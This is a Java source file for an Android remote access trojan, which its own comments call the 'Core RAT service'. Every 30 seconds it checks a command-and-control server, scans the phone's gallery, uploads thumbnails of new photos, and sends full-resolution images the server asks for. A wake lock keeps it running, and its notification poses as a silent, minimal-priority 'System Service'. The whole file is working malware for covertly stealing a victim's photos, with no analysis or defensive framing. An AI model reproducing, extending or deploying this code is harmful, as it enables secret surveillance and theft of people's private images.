package com.app.minirat;

import com.app.minirat.BuildConfig;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.content.pm.ServiceInfo;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.util.ArrayList;
import java.util.Set;

/**
 * Core RAT service. Runs as a foreground service and periodically:
 * 1. Checks if the C2 server is reachable
 * 2. Scans the gallery for new (un-uploaded) images
 * 3. Uploads thumbnails of new images
 * 4. Checks for full-image download requests and fulfills them
 */
public class Service extends android.app.Service {
    private static final String TAG = "Service";
    private static final String CHANNEL_ID = "ServiceChannel";
    private static final int NOTIFICATION_ID = 1;
    private static final long SCAN_INTERVAL_MS = 30 * 1000L;

    private Handler handler;
    private NetworkManager network;
    private GalleryScanner scanner;
    private UploadTracker tracker;
    private PowerManager.WakeLock wakeLock;
    private boolean isScanning = false;
    private volatile boolean isUploadingFullRes = false;

    // ─── Lifecycle ─────────────────────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        handler = new Handler(Looper.getMainLooper());
        network = new NetworkManager(BuildConfig.DOMAIN_URL);
        scanner = new GalleryScanner(getContentResolver());
        tracker = new UploadTracker(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, createNotification(),
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(NOTIFICATION_ID, createNotification());
        }

        scheduleScan();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "Service destroyed");
        handler.removeCallbacks(scanRunnable);
        releaseWakeLock();
        super.onDestroy();
    }

    // ─── Scan scheduling ───────────────────────────────────────────────

    private void scheduleScan() {
        handler.post(scanRunnable);
    }

    private final Runnable scanRunnable = new Runnable() {
        @Override
        public void run() {
            if (!isScanning) {
                new Thread(() -> runScanCycle()).start();
            }
            handler.postDelayed(this, SCAN_INTERVAL_MS);
        }
    };

    // ─── Scan cycle ────────────────────────────────────────────────────

    private void runScanCycle() {
        isScanning = true;
        acquireWakeLock();

        try {
            // Step 1: Server reachable?
            if (!network.isServerReachable()) {
                Log.d(TAG, "Server not reachable, skipping cycle");
                return;
            }
            Log.d(TAG, "Server reachable, starting scan");

            // Step 2: Spawn full-res thread (parallel, non-blocking)
            spawnFullResThread();

            // Step 3: Upload new thumbnails (runs on this thread)
            uploadNewThumbnails();

        } catch (Exception e) {
            Log.e(TAG, "Error in scan cycle", e);
        } finally {
            isScanning = false;
            releaseWakeLock();
        }
    }

    /**
     * Scans gallery, filters already-uploaded, uploads new thumbnails.
     */
    private void uploadNewThumbnails() {
        Set<String> uploadedIds = tracker.getUploadedIds();
        ArrayList<MediaItem> allImages = scanner.getAllImages();
        Log.d(TAG, "Total: " + allImages.size() + " | Already uploaded: " + uploadedIds.size());

        int uploaded = 0;
        for (MediaItem item : allImages) {
            if (tracker.isUploaded(item.id)) continue;

            try {
                String thumb = scanner.createThumbnail(item.uri);
                if (thumb != null) {
                    boolean ok = network.uploadThumbnail(item.displayName, thumb);
                    if (ok) {
                        tracker.markAsUploaded(item.id);
                        uploaded++;
                        Log.d(TAG, "Uploaded: " + item.displayName);
                    } else {
                        Log.w(TAG, "Upload failed, stopping cycle");
                        break;
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error processing: " + item.displayName, e);
            }
        }
        Log.d(TAG, "Uploaded " + uploaded + " new thumbnails");
    }

    // ─── Full-res (parallel thread) ────────────────────────────────────

    /**
     * Spawns a separate thread to fulfill full-image requests.
     * Guard flag prevents duplicate threads from running.
     */
    private void spawnFullResThread() {
        if (isUploadingFullRes) {
            Log.d(TAG, "Full-res thread already running, skipping");
            return;
        }
        new Thread(() -> fulfillFullImageRequests()).start();
    }

    /**
     * Checks for pending full-image requests and uploads them.
     * Runs on its own thread, parallel to thumbnail uploads.
     */
    private void fulfillFullImageRequests() {
        isUploadingFullRes = true;
        try {
            ArrayList<String> requests = network.getPendingRequests();
            if (requests.isEmpty()) return;

            Log.d(TAG, "Fulfilling " + requests.size() + " full-image requests (parallel thread)");

            for (String fileName : requests) {
                try {
                    MediaItem item = scanner.findByName(fileName);
                    if (item == null) {
                        Log.w(TAG, "Requested image not found: " + fileName);
                        network.markRequestFulfilled(fileName);
                        continue;
                    }

                    String imageBase64 = scanner.readFullImage(item.uri);
                    if (imageBase64 != null) {
                        boolean ok = network.uploadFullImage(fileName, imageBase64);
                        if (ok) {
                            network.markRequestFulfilled(fileName);
                            Log.d(TAG, "Fulfilled full-image request: " + fileName);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error fulfilling request: " + fileName, e);
                }
            }
        } finally {
            isUploadingFullRes = false;
        }
    }

    // ─── WakeLock ──────────────────────────────────────────────────────

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "minirat:upload");
        wakeLock.acquire(30 * 60 * 1000L);
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            Log.d(TAG, "WakeLock released");
        }
    }

    // ─── Notification ──────────────────────────────────────────────────

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW);
            channel.setSound(null, null);
            channel.setVibrationPattern(new long[]{0});
            channel.setImportance(NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running in background")
                .setSmallIcon(R.drawable.ic_notification)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setAutoCancel(false)
                .setOngoing(true)
                .build();
    }
}
